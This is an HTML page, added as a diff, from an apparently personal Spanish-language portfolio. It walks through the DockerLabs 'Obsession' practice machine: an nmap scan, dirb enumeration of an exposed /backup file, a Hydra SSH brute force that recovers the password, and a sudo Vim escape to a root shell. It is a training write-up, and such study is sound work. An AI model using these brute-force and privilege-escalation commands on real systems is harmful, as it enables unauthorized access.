@@ -1,0 +1,208 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Obsession · DockerLabs</title>
+  <meta name="description" content="Directorio /backup expuesto con un usuario, fuerza bruta SSH con Hydra y escalada a root abusando de un sudo sobre Vim.">
+  <meta property="og:title" content="Obsession">
+  <meta property="og:description" content="Directorio /backup expuesto con un usuario, fuerza bruta SSH con Hydra y escalada a root abusando de un sudo sobre Vim.">
+  <meta property="og:type" content="article">
+  <meta name="theme-color" content="#0b0d10">
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <link rel="stylesheet" href="estilos.css">
+</head>
+<body>
+  <button type="button" class="toc-toggle" aria-label="Abrir índice de máquinas">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/></svg>
+  </button>
+  <div class="toc-backdrop"></div>
+  <nav class="toc toc-nav" aria-label="Máquinas">
+    <div class="toc-win"><div class="toc-bar"><span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span><span class="toc-title">máquinas</span></div><div class="toc-tree"><a class="toc-home" href="index.html"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.5 12 3l9 7.5M5 9.5V20a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V9.5"/><path d="M9.5 21v-6h5v6"/></svg><span>Portfolio</span></a><ul class="tree">
+<li class="tnode tiene-hijos abierto"><button type="button" class="trow trow-plat"><span class="tchev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 6 6 6-6 6"/></svg></span><span class="tlabel">DockerLabs</span><span class="tcount">2</span></button><ul class="tsub">
+<li class="tnode tiene-hijos abierto"><button type="button" class="trow trow-dif"><span class="tchev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 6 6 6-6 6"/></svg></span><span class="tdot dif-muy-facil"></span><span class="tlabel">Muy fácil</span><span class="tcount">2</span></button><ul class="tsub">
+<li><a class="tleaf" href="breakmyssh.html">BreakMySSH</a></li>
+<li><a class="tleaf activo" href="obsession.html">Obsession</a></li>
+</ul></li>
+</ul></li>
+</ul></div></div>
+  </nav>
+
+  <div class="wrap">
+    <a class="volver" href="index.html">← Portfolio</a>
+    <header class="masthead">
+      <div class="eyebrow">DockerLabs · Máquina Linux</div>
+      <h1 class="title">Obsession</h1>
+      <p class="dek">Directorio /backup expuesto con un usuario, fuerza bruta SSH con Hydra y escalada a root abusando de un sudo sobre Vim.</p>
+      <div class="meta-row">
+        <span><b>Objetivo</b> 172.17.0.2</span><span><b>Servicios</b> 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP)</span><span><b>Dificultad</b> Muy fácil</span><span><b>Saltos de usuario</b> 2</span>
+      </div>
+    </header>
+
+    <div class="report">
+      <div class="rail-line"></div>
+      <section class="phase">
+  <div class="phase-node"><span></span></div>
+  <div class="phase-body">
+    <div class="phase-num">Fase 1</div>
+    <h2 class="phase-title">Despliegue</h2>
+    <p class="phase-sub">obsession.tar · auto_deploy.sh</p>
+    <p>Se descomprime el archivo, se despliega la máquina y se comprueba la conectividad con la IP asignada.</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">despliegue</span>
+  </div>
+  <div class="term-body"><pre><span class="p">$</span> <span class="c">unzip obsession.zip</span>
+  inflating: obsession.tar
+  inflating: auto_deploy.sh
+<span class="p">$</span> <span class="c">bash auto_deploy.sh obsession.tar</span>
+<span class="hl">Máquina desplegada, su dirección IP es --&gt; 172.17.0.2</span>
+<span class="p">$</span> <span class="c">ping -c 4 172.17.0.2</span>
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.045 ms</pre></div>
+</div>
+  </div>
+</section>
+<section class="phase">
+  <div class="phase-node"><span></span></div>
+  <div class="phase-body">
+    <div class="phase-num">Fase 2</div>
+    <h2 class="phase-title">Reconocimiento</h2>
+    <p class="phase-sub">nmap · escaneo de servicios</p>
+    <div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">nmap</span>
+  </div>
+  <div class="term-body"><pre><span class="p">$</span> <span class="c">nmap -sCV -sS -n -Pn -p- 172.17.0.2</span>
+PORT   STATE SERVICE VERSION
+<span class="hl">21/tcp open  ftp     vsftpd 3.0.5</span><span class="cm">   ← login anónimo habilitado</span>
+22/tcp open  ssh     OpenSSH 9.6p1
+80/tcp open  http    Apache httpd 2.4.58</pre></div>
+</div>
+<p>Tres servicios: <strong>FTP</strong> (con acceso anónimo), <strong>SSH</strong> y una <strong>web</strong> de coaching en el 80.</p>
+  </div>
+</section>
+<section class="phase">
+  <div class="phase-node"><span></span></div>
+  <div class="phase-body">
+    <div class="phase-num">Fase 3</div>
+    <h2 class="phase-title">Enumeración web</h2>
+    <p class="phase-sub">dirb · directorio /backup</p>
+    <p>El código fuente de la web tiene un comentario sospechoso. Ampliamos la búsqueda de recursos ocultos con <strong>Dirb</strong>.</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">dirb</span>
+  </div>
+  <div class="term-body"><pre><span class="p">$</span> <span class="c">dirb http://172.17.0.2</span>
+<span class="hl">&gt; DIRECTORY: </span>http://172.17.0.2/backup/==
++ http://172.17.0.2/backup/backup.txt (CODE:200)</pre></div>
+</div>
+<p>Dentro de <code>/backup/</code> hay un <code>backup.txt</code> con información sensible:</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">backup.txt</span>
+  </div>
+  <div class="term-body"><pre><span class="p">$</span> <span class="c">curl http://172.17.0.2/backup/backup.txt</span>
+<span class="hl">Usuario para todos mis servicios: russoski (cambiar pronto!)</span></pre></div>
+</div>
+<p>Tenemos un usuario válido: <strong>russoski</strong>.</p>
+  </div>
+</section>
+<section class="phase">
+  <div class="phase-node"><span></span></div>
+  <div class="phase-body">
+    <div class="phase-num">Fase 4</div>
+    <h2 class="phase-title">Explotación · fuerza bruta</h2>
+    
+    <p>hydra sobre SSH</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">hydra</span>
+  </div>
+  <div class="term-body"><pre><span class="p">$</span> <span class="c">hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50 -I</span>
+[22][ssh] host: 172.17.0.2   login: russoski   password: <span class="hl">iloveme</span></pre></div>
+</div>
+<p>Con <strong><code>russoski</code> : <code>iloveme</code></strong> entramos por SSH:</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">acceso como russoski</span>
+  </div>
+  <div class="term-body"><pre><span class="p">$</span> <span class="c">ssh russoski@172.17.0.2</span>
+<span class="hl">russoski@a1919dfe5717:~$</span></pre></div>
+</div>
+  </div>
+</section>
+<section class="phase root-phase">
+  <div class="phase-node"><span></span></div>
+  <div class="phase-body">
+    <div class="phase-num">Fase 5</div>
+    <h2 class="phase-title">Escalada de privilegios · sudo Vim</h2>
+    <p class="phase-sub">russoski → root</p>
+    <p>Revisamos los permisos de <code>sudo</code>:</p>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">sudo -l</span>
+  </div>
+  <div class="term-body"><pre><span class="p">russoski@a1919dfe5717:~$</span> <span class="c">sudo -l</span>
+User russoski may run the following commands on a1919dfe5717:
+    (root) NOPASSWD: <span class="hl">/usr/bin/vim</span></pre></div>
+</div>
+<div class="callout cool">
+  <span class="callout-label">GTFOBins · Vim</span>
+  <p>Vim ejecutable como <code>root</code> permite lanzar un shell desde su modo comando (<code>:!</code>). Es un abuso clásico recogido en GTFOBins.</p>
+</div>
+<div class="term">
+  <div class="term-bar">
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-dot"></span>
+    <span class="term-label">escalada a root</span>
+  </div>
+  <div class="term-body"><pre><span class="p">russoski@a1919dfe5717:~$</span> <span class="c">sudo /usr/bin/vim -c ':!/bin/bash'</span>
+<span class="p">#</span> <span class="c">whoami</span>
+<span class="hl">root</span></pre></div>
+</div>
+<div class="flag-block">
+  <div class="flag-icon">🗝️</div>
+  <p class="flag-msg">¡Máquina completada! Acceso conseguido como root.</p>
+  <div class="flag-path">uid=0(root)</div>
+</div>
+  </div>
+</section>
+    </div>
+
+    <footer class="site-footer">
+      <div class="foot-top">
+        <span>DockerLabs · Obsession</span>
+        <span class="foot-right">172.17.0.2 → uid=0</span>
+      </div>
+      <div class="foot-bottom">
+        <span>© snicker. Todos los derechos reservados.</span>
+        <span class="foot-note"><a href="index.html">← Volver al portfolio</a></span>
+      </div>
+    </footer>
+  </div>
+
+  <script src="filtros.js"></script>
+</body>
+</html>
